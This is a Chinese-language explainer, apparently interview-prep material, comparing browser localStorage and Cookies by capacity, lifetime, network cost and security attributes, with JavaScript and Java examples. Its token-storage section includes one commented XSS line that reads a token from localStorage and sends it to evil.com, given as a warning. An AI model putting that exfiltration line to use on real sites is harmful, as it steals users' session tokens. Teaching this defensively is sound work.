# localStorage 和 Cookie 区别是什么

## 核心概念

localStorage 和 Cookie 都是浏览器端的存储机制，但设计目标和能力不同。Cookie 是为"客户端-服务端通信"设计的，每次请求自动携带，容量小（4 KB）；localStorage 是 HTML5 引入的纯客户端存储，容量大（5-10 MB），不自动携带。两者各有适用场景，混淆会导致安全和功能问题。

## 标准回答

localStorage vs Cookie 核心差异：

| 维度 | Cookie | localStorage |
|------|--------|--------------|
| 设计目的 | 客户端-服务端通信 | 纯客户端存储 |
| 容量 | 4 KB / 个，50 个 / 域 | 5-10 MB / 域 |
| 自动携带 | 每次请求自动带 | 不自动带 |
| 网络 | 占用请求带宽 | 不占网络 |
| 生命周期 | 可设过期，否则会话级 | 永久（除非手动清除） |
| API | document.cookie（字符串解析） | localStorage.getItem/setItem |
| 跨标签页 | 同域共享 | 同域共享 |
| HttpOnly | 支持（防 XSS） | 不支持 |
| 与服务端通信 | 自动 | 需手动读取后发请求 |

## 详细机制

### Cookie 的工作方式

```
1. 服务端响应带 Set-Cookie
   Set-Cookie: sessionId=abc; HttpOnly; Secure; Max-Age=3600

2. 浏览器存储

3. 后续同域请求自动携带
   Cookie: sessionId=abc
```

特点：

- 每次请求自动带（同域、同路径）
- 受 HttpOnly、Secure、SameSite 等属性控制
- 大小受限（4 KB）
- 跨标签页共享（同域）

### localStorage 的工作方式

```javascript
// 存储
localStorage.setItem('user', JSON.stringify({ id: 42, name: 'Alice' }));

// 读取
const user = JSON.parse(localStorage.getItem('user'));

// 删除
localStorage.removeItem('user');

// 清空
localStorage.clear();
```

特点：

- 不自动携带，需 JS 读取后手动发请求
- 容量大（5-10 MB）
- 永久存储，除非手动清除
- 同域共享（跨标签页）

### 容量对比

```
Cookie:
  单个 ≤ 4 KB（含名称和值）
  每域名 ≤ 50 个
  总计 ≤ 几十 KB

localStorage:
  每域名 5-10 MB（浏览器实现不同）
  总计可达几十 MB
```

Cookie 适合小数据（SessionId、用户偏好），localStorage 适合大数据（缓存、用户配置）。

### 网络开销对比

**Cookie**：

```
每次同域请求都带 Cookie:
GET /api/users HTTP/1.1
Cookie: sessionId=abc; theme=dark; lang=zh; tracking=xyz; ...
```

即使请求不需要这些数据，Cookie 仍占带宽。Cookie 大时（如含复杂用户信息）每次请求都浪费流量。

**localStorage**：

```
GET /api/users HTTP/1.1
# 不带 localStorage 数据
# 需要时 JS 读取后手动加到请求
```

不占请求带宽，按需读取。

### 生命周期对比

**Cookie**：

```
Set-Cookie: name=value; Max-Age=3600   # 1 小时后过期
Set-Cookie: name=value; Expires=Wed, 01 Jan 2025 10:00:00 GMT
Set-Cookie: name=value                  # 不设过期 → 浏览器关闭即失效（会话 Cookie）
```

**localStorage**：

```
localStorage.setItem('key', 'value');   # 永久存储
# 浏览器关闭、重启、过几天都还在
# 必须手动 removeItem 或 clear 才能删除
```

### 安全性对比

**Cookie 安全**：

- HttpOnly：JavaScript 不可读，防 XSS 窃取
- Secure：仅 HTTPS 传输
- SameSite：防 CSRF
- Path/Domain：限制范围

**localStorage 安全**：

- 无 HttpOnly（JavaScript 必须能访问）
- XSS 可直接读取
- 无 SameSite 等防护
- 同源策略保护（仅同域可访问）

**localStorage 不能存敏感信息**：XSS 攻击下，攻击者可直接 `localStorage.getItem('token')` 拿到。

### 什么数据存哪里

**适合 Cookie**：

- SessionId（需自动携带）
- 用户偏好（语言、主题，需服务端知道）
- 跟踪标识（需每次请求带）
- 跨子域共享的标识

**适合 localStorage**：

- 大数据（用户配置、草稿）
- 不需要每次请求带的数据
- 客户端缓存（如 API 响应）
- 临时状态（如未提交的表单）

**不适合 localStorage**：

- 敏感信息（密码、Token）→ XSS 可读
- 需要服务端访问的数据 → localStorage 不自动带

### 跨标签页共享

```javascript
// 标签页 A 设置
localStorage.setItem('user', 'Alice');

// 标签页 B 监听变化
window.addEventListener('storage', (e) => {
    if (e.key === 'user') {
        console.log('User changed:', e.newValue);
    }
});
```

localStorage 跨同域标签页共享，storage 事件可监听变化。Cookie 也跨标签页共享但无事件机制。

### 其他客户端存储

| 存储 | 容量 | 用途 |
|------|------|------|
| Cookie | 4 KB | 客户端-服务端通信 |
| localStorage | 5-10 MB | 永久客户端存储 |
| sessionStorage | 5-10 MB | 会话级客户端存储（标签页关闭即清） |
| IndexedDB | 几百 MB | 结构化大数据存储 |
| Cache API | 几百 MB | Service Worker 缓存 |

## 代码示例

JavaScript 操作 Cookie：

```javascript
// 设置 Cookie
document.cookie = 'user=Alice; max-age=3600; path=/; Secure; SameSite=Strict';

// 读取 Cookie（需解析字符串）
const cookies = document.cookie.split(';').reduce((acc, c) => {
    const [k, v] = c.trim().split('=');
    acc[k] = v;
    return acc;
}, {});
console.log(cookies.user);   // Alice

// 删除 Cookie（设 max-age=0）
document.cookie = 'user=; max-age=0; path=/';
```

JavaScript 操作 localStorage：

```javascript
// 存储
localStorage.setItem('user', JSON.stringify({ id: 42, name: 'Alice' }));

// 读取
const user = JSON.parse(localStorage.getItem('user') || 'null');

// 删除
localStorage.removeItem('user');

// 监听跨标签页变化
window.addEventListener('storage', (e) => {
    console.log(`${e.key} changed from ${e.oldValue} to ${e.newValue}`);
});
```

Token 存储位置选择：

```javascript
// 反例：Token 存 localStorage（XSS 可读）
localStorage.setItem('token', jwt);
// 后续请求
fetch('/api/users', {
    headers: { 'Authorization': 'Bearer ' + localStorage.getItem('token') }
});
// 攻击者 XSS 注入：const t = localStorage.getItem('token'); fetch('https://evil.com/?t='+t);

// 正例：Token 存 HttpOnly Cookie（XSS 不可读）
// 服务端 Set-Cookie: token=jwt; HttpOnly; Secure; SameSite=Strict
// 浏览器自动带，JS 无法读取
fetch('/api/users', { credentials: 'include' });
```

服务端设置 Cookie：

```java
import javax.servlet.http.*;

Cookie cookie = new Cookie("token", jwt);
cookie.setHttpOnly(true);
cookie.setSecure(true);
cookie.setPath("/");
cookie.setMaxAge(3600);
response.addCookie(cookie);
```

## 实战场景

| 场景 | 选择 | 原因 |
|------|------|------|
| SessionId | Cookie | 自动携带 |
| Token | HttpOnly Cookie | 防 XSS |
| 用户偏好 | Cookie 或 localStorage | 需服务端知道用 Cookie |
| 大数据缓存 | localStorage | 不占带宽 |
| 表单草稿 | localStorage | 客户端临时存储 |
| 跨标签页状态 | localStorage + storage 事件 | 通知机制 |
| 离线应用 | IndexedDB + Cache API | 大数据 + 离线 |

## 深挖追问

**Q1：localStorage 完全不安全吗？**
同源策略保护，跨域不可访问。但 XSS 注入的脚本同源，可读取。所以不要存敏感信息。

**Q2：Cookie 一定自动带吗？**
默认同域同路径自动带。SameSite=None 跨站也带（需 Secure）。SameSite=Strict 跨站不带。

**Q3：localStorage 会被网络请求携带吗？**
不会。需要 JS 读取后手动加到请求（如 Authorization 头）。

**Q4：清浏览器缓存会清 localStorage 吗？**
不一定。"清除缓存"通常只清 Cache，不清 localStorage。"清除站点数据"才会清。

**Q5：localStorage 满了会怎样？**
抛 `QuotaExceededError`。需捕获异常并清理旧数据。

## 易错点

- **"localStorage 比 Cookie 安全"** — 反了，Cookie 有 HttpOnly，localStorage 必须可被 JS 读。
- **"localStorage 自动发送到服务端"** — 不，需手动读取后发请求。
- **"Cookie 容量大"** — 4 KB 上限，比 localStorage 小得多。
- **"Token 一定要存 localStorage"** — 不，HttpOnly Cookie 更安全。
- **"localStorage 关浏览器就清"** — 不，永久存储，需手动清。

## 总结

localStorage 和 Cookie 都是浏览器端存储，但设计目标不同：Cookie 为客户端-服务端通信设计（自动携带、小容量），localStorage 为纯客户端存储设计（不自动带、大容量）。Cookie 配置 HttpOnly 防 XSS，localStorage 必须可被 JS 读不适合存敏感信息。Token 推荐存 HttpOnly Cookie。生产中按数据特征选存储：小且需自动带用 Cookie，大且客户端用用 localStorage。

## 参考资料

- [RFC 6265 — HTTP State Management (Cookie)](https://datatracker.ietf.org/doc/html/rfc6265)
- [MDN — localStorage](https://developer.mozilla.org/en-US/docs/Web/API/Window/localStorage)
- [MDN — Cookies](https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies)
- [OWASP — HTML5 Web Storage](https://cheatsheetseries.owasp.org/cheatsheets/HTML5_Security_Cheat_Sheet.html)
